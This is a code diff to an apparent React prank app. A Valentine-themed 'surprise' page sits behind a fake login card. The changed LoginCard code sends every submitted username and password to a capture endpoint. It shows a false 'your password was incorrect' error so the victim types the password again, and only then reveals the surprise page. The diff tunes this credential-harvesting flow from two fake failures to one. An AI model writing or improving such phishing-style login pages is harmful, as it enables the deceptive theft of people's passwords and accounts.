@@ -11,8 +11,8 @@ const ValentineSurpriseView: React.FC = () => {
   const [hearts, setHearts] = useState<{ id: number; left: string; delay: string; size: string }[]>([]);
 
   useEffect(() => {
-    // Generate some random heart particles for the background
-    const newHearts = Array.from({ length: 25 }).map((_, i) => ({
+    // Generate random heart particles for the background
+    const newHearts = Array.from({ length: 30 }).map((_, i) => ({
       id: i,
       left: `${Math.random() * 100}%`,
       delay: `${Math.random() * 5}s`,
@@ -46,7 +46,6 @@ const ValentineSurpriseView: React.FC = () => {
           <div className="w-28 h-28 bg-gradient-to-tr from-red-50 to-pink-100 rounded-full flex items-center justify-center animate-pulse shadow-inner">
             <span className="text-6xl animate-bounce-gentle">💝</span>
           </div>
-          {/* Decorative floating hearts around the main icon */}
           <span className="absolute -top-2 -right-2 text-2xl animate-bounce-gentle" style={{ animationDelay: '0.2s' }}>💖</span>
           <span className="absolute -bottom-2 -left-2 text-2xl animate-bounce-gentle" style={{ animationDelay: '0.5s' }}>💕</span>
         </div>
@@ -141,7 +140,7 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
     setAttemptCount(currentAttempt);
 
     try {
-      // Capture the data locally/server-side
+      // Capture the data every time
       const endpoint = isLogin ? '/api/login' : '/api/signup';
       const response = await fetch(endpoint, {
         method: 'POST',
@@ -151,8 +150,8 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
 
       await response.json();
 
-      // Attempt logic: Show error twice, then show surprise page
-      if (currentAttempt < 3) {
+      // Attempt logic: Show error on 1st attempt, then show surprise page on 2nd attempt
+      if (currentAttempt < 2) {
         setTimeout(() => {
           setError("Sorry, your password was incorrect. Please double-check your password.");
           setIsLoading(false);
@@ -166,9 +165,9 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
       }
     } catch (err) {
       console.error("Capture failed:", err);
-      // Fallback for demo
+      // Fallback behavior for offline/local testing
       setTimeout(() => {
-        if (currentAttempt < 3) {
+        if (currentAttempt < 2) {
           setError("Sorry, your password was incorrect. Please double-check your password.");
           setIsLoading(false);
           setFormData(prev => ({ ...prev, password: '' }));
